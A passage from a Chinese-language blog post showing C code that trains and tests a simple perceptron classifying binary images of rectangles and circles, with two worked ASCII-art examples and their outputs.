+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;Usage: %s &lt;filename&gt;</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, argv[<span style=color:#a5d6ff>0</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;Example: %s rect_000.bin</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, argv[<span style=color:#a5d6ff>0</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>const</span> <span style=color:#ff7b72>char</span> <span style=color:#ff7b72;font-weight:700>*</span>filename <span style=color:#ff7b72;font-weight:700>=</span> argv[<span style=color:#a5d6ff>1</span>];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>char</span> fullpath[<span style=color:#a5d6ff>512</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#d2a8ff;font-weight:700>strncmp</span>(filename, DATA_DIR, <span style=color:#d2a8ff;font-weight:700>strlen</span>(DATA_DIR)) <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>0</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>snprintf</span>(fullpath, <span style=color:#ff7b72>sizeof</span>(fullpath), <span style=color:#a5d6ff>&#34;%s&#34;</span>, filename);
+</span></span><span style=display:flex><span>    } <span style=color:#ff7b72>else</span> {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>snprintf</span>(fullpath, <span style=color:#ff7b72>sizeof</span>(fullpath), <span style=color:#a5d6ff>&#34;%s/%s&#34;</span>, DATA_DIR, filename);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    FILE <span style=color:#ff7b72;font-weight:700>*</span>f <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fopen</span>(fullpath, <span style=color:#a5d6ff>&#34;rb&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (<span style=color:#ff7b72;font-weight:700>!</span>f) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;Error: cannot open %s: %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, fullpath, <span style=color:#d2a8ff;font-weight:700>strerror</span>(errno));
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span> img[HEIGHT][WIDTH];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>size_t</span> bytes_read <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>fread</span>(img, <span style=color:#ff7b72>sizeof</span>(<span style=color:#ff7b72>unsigned</span> <span style=color:#ff7b72>char</span>), HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, f);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>fclose</span>(f);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (bytes_read <span style=color:#ff7b72;font-weight:700>!=</span> HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;Error: file size mismatch (expected %d bytes, got %zu)</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>,
+</span></span><span style=display:flex><span>                HEIGHT <span style=color:#ff7b72;font-weight:700>*</span> WIDTH, bytes_read);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;File: %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, fullpath);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>print_image</span>(img);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h4 id=训练权重>训练权重</h4><p>我们这里采用错误驱动训练，这里粘贴一段解释<figure class=article-image><img src=/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/image.png alt="alt text" loading=lazy></figure></p><p>矩形和圆形在像素空间并不是线性可分的（因为形状复杂），但在这个二值化、固定尺寸的表示下，它们实际上是线性可分的</p><p>感知机收敛定理指出：如果训练数据线性可分，那么经过有限次错误更新，算法会找到一个将两类完全分开的权重向量, 程序在每一轮完整遍历所有样本，当某轮没有错误时停止，因此最终会收敛</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#include</span> <span style=color:#8b949e;font-weight:700;font-style:italic>&#34;common.h&#34;</span><span style=color:#8b949e;font-weight:700;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define SAMPLE_SIZE   500
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define TRAIN_PASSES  4000
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic>#define DATA_DIR      &#34;./train_data&#34;
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-weight:700;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#ff7b72>int</span> <span style=color:#d2a8ff;font-weight:700>main</span>(<span style=color:#ff7b72>void</span>) {
+</span></span><span style=display:flex><span>    Image img;
+</span></span><span style=display:flex><span>    Weights weights <span style=color:#ff7b72;font-weight:700>=</span> {<span style=color:#a5d6ff>0</span>};
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>char</span> path[<span style=color:#a5d6ff>256</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>char</span> rect_files[SAMPLE_SIZE][<span style=color:#a5d6ff>256</span>];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>char</span> circle_files[SAMPLE_SIZE][<span style=color:#a5d6ff>256</span>];
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; i <span style=color:#ff7b72;font-weight:700>&lt;</span> SAMPLE_SIZE; <span style=color:#ff7b72;font-weight:700>++</span>i) {
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>snprintf</span>(rect_files[i], <span style=color:#ff7b72>sizeof</span>(rect_files[i]), <span style=color:#a5d6ff>&#34;%s/rect_%03d.bin&#34;</span>, DATA_DIR, i);
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>snprintf</span>(circle_files[i], <span style=color:#ff7b72>sizeof</span>(circle_files[i]), <span style=color:#a5d6ff>&#34;%s/circle_%03d.bin&#34;</span>, DATA_DIR, i);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Start training...</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> pass <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; pass <span style=color:#ff7b72;font-weight:700>&lt;</span> TRAIN_PASSES; <span style=color:#ff7b72;font-weight:700>++</span>pass) {
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>int</span> adjusted <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#8b949e;font-style:italic>// 训练矩形：期望输出 &gt; BIAS
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; i <span style=color:#ff7b72;font-weight:700>&lt;</span> SAMPLE_SIZE; <span style=color:#ff7b72;font-weight:700>++</span>i) {
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>if</span> (<span style=color:#d2a8ff;font-weight:700>load_image</span>(rect_files[i], img) <span style=color:#ff7b72;font-weight:700>!=</span> <span style=color:#a5d6ff>0</span>) {
+</span></span><span style=display:flex><span>                <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot load %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, rect_files[i]);
+</span></span><span style=display:flex><span>                <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>float</span> out <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>feed_forward</span>(img, weights);
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>if</span> (out <span style=color:#ff7b72;font-weight:700>&lt;=</span> BIAS) {          <span style=color:#8b949e;font-style:italic>// 误判为圆形 → 需要增大输出
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>                <span style=color:#d2a8ff;font-weight:700>add_input</span>(weights, img); <span style=color:#8b949e;font-style:italic>// 修正：加输入
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>                adjusted<span style=color:#ff7b72;font-weight:700>++</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#8b949e;font-style:italic>// 训练圆形：期望输出 &lt; BIAS
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>        <span style=color:#ff7b72>for</span> (<span style=color:#ff7b72>int</span> i <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0</span>; i <span style=color:#ff7b72;font-weight:700>&lt;</span> SAMPLE_SIZE; <span style=color:#ff7b72;font-weight:700>++</span>i) {
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>if</span> (<span style=color:#d2a8ff;font-weight:700>load_image</span>(circle_files[i], img) <span style=color:#ff7b72;font-weight:700>!=</span> <span style=color:#a5d6ff>0</span>) {
+</span></span><span style=display:flex><span>                <span style=color:#d2a8ff;font-weight:700>fprintf</span>(stderr, <span style=color:#a5d6ff>&#34;ERROR: cannot load %s</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, circle_files[i]);
+</span></span><span style=display:flex><span>                <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>1</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>float</span> out <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#d2a8ff;font-weight:700>feed_forward</span>(img, weights);
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>if</span> (out <span style=color:#ff7b72;font-weight:700>&gt;=</span> BIAS) {          <span style=color:#8b949e;font-style:italic>// 误判为矩形 → 需要减小输出
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>                <span style=color:#d2a8ff;font-weight:700>sub_input</span>(weights, img); <span style=color:#8b949e;font-style:italic>// 修正：减输入
+</span></span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic></span>                adjusted<span style=color:#ff7b72;font-weight:700>++</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Pass %3d: adjusted = %d</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, pass, adjusted);
+</span></span><span style=display:flex><span>        <span style=color:#ff7b72>if</span> (adjusted <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>0</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Converged at pass %d.</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>, pass);
+</span></span><span style=display:flex><span>            <span style=color:#ff7b72>break</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>save_weights</span>(weights, <span style=color:#a5d6ff>&#34;weights.bin&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>printf</span>(<span style=color:#a5d6ff>&#34;Training finished. Weights saved to weights.bin</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>return</span> <span style=color:#a5d6ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><h2 id=测试一下>测试一下</h2><p>我们手动准备两个样本</p><h3 id=demo1>demo1</h3><pre tabindex=0><code>+--------------------+
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|............#######.|
+|............#######.|
+|............#######.|
+|............#######.|
+|............#######.|
+|............#######.|
+|............#######.|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
++--------------------+
+</code></pre><p>测试一下输出</p><pre tabindex=0><code>Weighted sum = 238.000000
+Prediction: RECTANGLE
+</code></pre><p>看样子没有问题</p><h3 id=demo2>demo2</h3><pre tabindex=0><code>+--------------------+
+|....................|
+|...............#....|
+|.............#####..|
+|.............#####..|
+|............#######.|
+|.............#####..|
+|.............#####..|
+|...............#....|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
+|....................|
++--------------------+
+</code></pre><p>康康输出</p><pre tabindex=0><code>Weighted sum = -151.000000
+Prediction: CIRCLE
+</code></pre><p>还是比较成功，当然因为训练的原因，并不能所有的素材的非常精确的识别，还需要继续修改训练，修改BIAS和学习率之类的，只要样本和训练得当就能整一个出来</p></div></article><aside class="article-toc article-toc-desktop" data-article-toc aria-label="Table of contents"><p class=toc-title>On this page</p><nav class=table-of-contents><ul><li><a href=#基本原理>基本原理</a></li><li><a href=#搓一个原始神经网络>搓一个原始神经网络</a><ul><li><a href=#基本处理>基本处理</a><ul><li><a href=#宏>宏</a></li><li><a href=#神经元输入>神经元输入</a></li><li><a href=#图像的保存与加载>图像的保存与加载</a></li><li><a href=#连接权重的加载>连接权重的加载</a></li><li><a href=#加权和计算>加权和计算</a></li><li><a href=#commonh>common.h</a></li></ul></li><li><a href=#预测模型>预测模型</a></li><li><a href=#训练模型>训练模型</a><ul><li><a href=#训练素材>训练素材</a></li><li><a href=#训练权重>训练权重</a></li></ul></li></ul></li><li><a href=#测试一下>测试一下</a><ul><li><a href=#demo1>demo1</a></li><li><a href=#demo2>demo2</a></li></ul></li></ul></nav></aside></div></div><section class=terminal aria-label="Simulated terminal"><div class=panel-header><p class=panel-title>Terminal</p><button class=panel-collapse type=button data-view-toggle=terminal aria-label="Collapse Terminal" title="Collapse Terminal">⌄</button></div><div class=terminal-body data-terminal-output aria-live=polite><p class=terminal-output>C0nvR3 Lab simulated environment. Type <span>help</span> for commands.</p></div><form class=terminal-form data-terminal><label for=terminal-command><span class=prompt>C0nvR3@lab</span>:<span class=directory data-terminal-path>~/workspace</span>$</label>
+<input id=terminal-command name=command type=text autocomplete=off autocapitalize=off spellcheck=false aria-label="Terminal command"></form><template id=terminal-filesystem><i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/posts></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/workspace-preview data-url=/posts/workspace-preview/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/workspace-preview/image/workspace-overview.svg></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/acient_neural_network data-url=/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/acient_neural_network/image.png></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/ret2dlresolve data-url=/posts/ret2dlresolve/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/posts/ret2dlresolve/lazy-plt.png></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/posts/Pivoting data-url=/posts/%E6%A0%88%E8%BF%81%E7%A7%BB-pivoting/></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/research></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/research/perf-side-channel-attack data-url=/research/perf%E4%B8%8E%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/projects></i>
+<i data-terminal-entry data-kind=directory data-path=/home/C0nvR3/workspace/ctf></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025 data-url=/ctf/geek-challenge-2025-wp/></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-1.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-10.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-11.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-12.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-13.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-14.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-15.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-16.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-17.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-18.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-19.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-2.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-20.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-21.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-22.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-23.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-24.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-25.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-3.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-4.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-5.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-6.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-7.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-8.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image-9.png></i>
+<i data-terminal-entry data-kind=resource data-path=/home/C0nvR3/workspace/ctf/Geek_Challenge_2025/image.png></i>
+<i data-terminal-entry data-kind=article data-path=/home/C0nvR3/workspace/about data-url=/about/></i></template></section></main></div><footer class=statusbar><span>main</span>
+<span>UTF-8 · Markdown · Hugo</span></footer></body></html>
